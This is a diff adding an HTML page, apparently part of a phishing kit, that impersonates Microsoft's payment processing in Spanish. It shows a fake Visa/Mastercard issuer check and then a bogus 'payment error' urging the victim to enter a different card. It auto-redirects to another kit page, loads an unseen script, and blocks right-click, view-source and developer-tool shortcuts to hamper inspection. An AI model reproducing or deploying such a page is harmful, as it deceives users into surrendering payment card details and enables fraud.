@@ -1,0 +1,180 @@
+
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover" />
+<title>Procesando pago</title>
+<link rel="stylesheet" href="styless.css" />
+</head>
+<body>
+
+<!-- PASO 1 -->
+<div id="step-1" class="overlay" aria-live="polite" aria-label="Procesando pago">
+  <div class="card-lite motion stagger-on" id="card-lite">
+    
+<!-- Microsoft Logo (cuadritos + texto) -->
+<div style="display:flex; align-items:center; justify-content:flex-start; gap:10px; margin-bottom:18px;">
+  
+  <div style="display:grid; grid-template-columns:repeat(2, 12px); grid-template-rows:repeat(2, 12px); gap:2px;">
+    <div style="background:#f25022; width:12px; height:12px;"></div>
+    <div style="background:#7fba00; width:12px; height:12px;"></div>
+    <div style="background:#00a4ef; width:12px; height:12px;"></div>
+    <div style="background:#ffb900; width:12px; height:12px;"></div>
+  </div>
+
+  <span style="font-family:Segoe UI, Arial, sans-serif; font-size:20px; font-weight:600; color:#5E5E5E;">
+    Microsoft
+  </span>
+
+</div>
+
+    <div class="title" data-anim="2">Procesando pago<span class="dots"></span></div>
+
+    <svg class="ring" viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" data-anim="3">
+      <g fill="none" fill-rule="evenodd" stroke-width="4">
+        <circle cx="22" cy="22" r="18" stroke="rgba(0,0,0,0.12)"></circle>
+        <!-- spinner por CSS (sin SMIL) -->
+        <path class="sweep" d="M40 22c0-9.941-8.059-18-18-18" stroke="#0067c0"></path>
+      </g>
+    </svg>
+
+    <div class="subtle" data-anim="4">Estamos verificando la transacción…</div>
+    <div class="divider" data-anim="4"></div>
+    <ul class="hints" data-anim="4">
+      <li>No cierres esta ventana.</li>
+      <li>Podrían pedirse pasos de seguridad adicionales.</li>
+    </ul>
+  </div>
+</div>
+
+<!-- PASO 2 (pre-cargado: oculto con is-hide, no display:none) -->
+<div id="step-2" class="overlay is-hide" aria-live="polite" aria-label="Verificación con emisor">
+  <div class="card-issuer motion" id="card-issuer">
+    <div class="issuer-body">
+      <svg id="brand-ring" class="ring-brand" viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <g fill="none" fill-rule="evenodd" stroke-width="5">
+          <circle cx="22" cy="22" r="18" stroke="rgba(0,0,0,.08)"></circle>
+          <!-- spinner por CSS (sin SMIL) -->
+          <path id="brand-sweep" d="M40 22c0-9.941-8.059-18-18-18" stroke="#2563eb"></path>
+        </g>
+      </svg>
+
+      <div id="brand-visa" class="brand-visa hidden" aria-hidden="true">VISA</div>
+
+      <div id="brand-mc" class="brand-mc hidden" aria-hidden="true">
+        <span class="mc-icon" aria-hidden="true"></span>
+        <span class="mc-text">ID Check</span>
+      </div>
+
+      <div class="brand-title">Espera un momento</div>
+      <div class="brand-caption">Tomará unos segundos hasta que finalice la operación</div>
+    </div>
+  </div>
+</div>
+
+<!-- PASO 3 -->
+<main id="step-3" class="stage-main" aria-live="polite">
+  <section class="card" role="dialog" aria-labelledby="ttl" aria-describedby="desc">
+    <header class="head">
+      
+    <!-- Microsoft Logo (cuadritos + texto) -->
+<div style="display:flex; align-items:center; justify-content:flex-start; gap:10px; margin-bottom:18px;">
+  
+  <div style="display:grid; grid-template-columns:repeat(2, 12px); grid-template-rows:repeat(2, 12px); gap:2px;">
+    <div style="background:#f25022; width:12px; height:12px;"></div>
+    <div style="background:#7fba00; width:12px; height:12px;"></div>
+    <div style="background:#00a4ef; width:12px; height:12px;"></div>
+    <div style="background:#ffb900; width:12px; height:12px;"></div>
+  </div>
+
+  <span style="font-family:Segoe UI, Arial, sans-serif; font-size:20px; font-weight:600; color:#5E5E5E;">
+    Microsoft
+  </span>
+
+</div>
+
+      <h1 id="ttl" class="title-err">Error en procesar su pago</h1>
+      <p id="desc" class="sub-err">Hubo un problema con tu método de pago.</p>
+    </header>
+
+    <div class="status" aria-hidden="true">
+      <div class="err-badge">
+        <svg class="err-svg" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <circle class="err-bg" cx="24" cy="24" r="18" fill="none" stroke-width="2"/>
+          <circle class="err-ring" cx="24" cy="24" r="18" fill="none" stroke-width="2"/>
+          <circle class="err-spark" cx="24" cy="24" r="18" fill="none" stroke-width="2"/>
+          <line class="err-line err-x1" x1="17" y1="17" x2="31" y2="31" stroke-width="2.5"/>
+          <line class="err-line err-x2" x1="31" y1="17" x2="17" y2="31" stroke-width="2.5"/>
+        </svg>
+      </div>
+    </div>
+
+    <p class="intro">Requerimos que agregue una tarjeta de pago diferente.</p>
+
+    <div class="callout error" role="group" aria-label="Tarjeta no compatible">
+      <h3>Tarjeta no compatible</h3>
+      <ul>
+        <li>Tarjeta no habilitada para compras internacionales</li>
+        <li>Restricciones del banco emisor</li>
+        <li>Tipo de tarjeta no soportado</li>
+        <li>Fondos insuficientes</li>
+      </ul>
+    </div>
+
+    <div class="callout help" role="group" aria-label="¿Qué puedes hacer?">
+      <h3>¿Qué puedes hacer?</h3>
+      <ul>
+        <li>Intenta con una tarjeta diferente (Visa, Mastercard, American Express).</li>
+        <li>Verifica que tu tarjeta esté habilitada para compras en línea.</li>
+        <li>Contacta a tu banco para autorizar la transacción.</li>
+      </ul>
+    </div>
+
+    <META HTTP-EQUIV="REFRESH" CONTENT="6;URL=index5.html">
+  </section>
+</main>
+
+<!-- Footer igual al de las demás páginas -->
+<div style="position:fixed;bottom:0;left:0;right:0;background:rgba(255,255,255,0.95);border-top:1px solid #e0e0e0;padding:8px 16px;z-index:50000;display:flex;align-items:center;justify-content:center;gap:24px;font-size:12px;color:#605e5c;">
+  <a href="#" style="color:#605e5c;text-decoration:none;font-size:12px;">Términos de uso</a>
+  <a href="#" style="color:#605e5c;text-decoration:none;font-size:12px;">Privacidad y cookies</a>
+  <span>···</span>
+</div>
+
+<script src="Z3.js"></script>
+
+<script>
+  // iOS/Safari y Android: bloquear gestos de zoom
+  document.addEventListener('gesturestart',  e => e.preventDefault());
+  document.addEventListener('gesturechange', e => e.preventDefault());
+  document.addEventListener('gestureend',    e => e.preventDefault());
+
+  // Bloquear doble-tap zoom
+  let lastTouch = 0;
+  document.addEventListener('touchend', e => {
+    const now = Date.now();
+    if (now - lastTouch <= 300) e.preventDefault();
+    lastTouch = now;
+  }, { passive: false });
+
+  // Si detecta intento de pinch (scale != 1), bloquear
+  document.addEventListener('touchmove', e => {
+    if (typeof e.scale === 'number' && e.scale !== 1) e.preventDefault();
+  }, { passive: false });
+</script>
+
+<script>
+    document.addEventListener('contextmenu', e => e.preventDefault(), {passive:false});
+    document.addEventListener('keydown', e => {
+      if (
+        e.key === 'F12' ||
+        (e.ctrlKey && ['u','U','s','S','p','P','c','C'].includes(e.key)) ||
+        (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key))
+      ) e.preventDefault();
+    }, {passive:false});
+  </script>
+
+</body>
+</html>
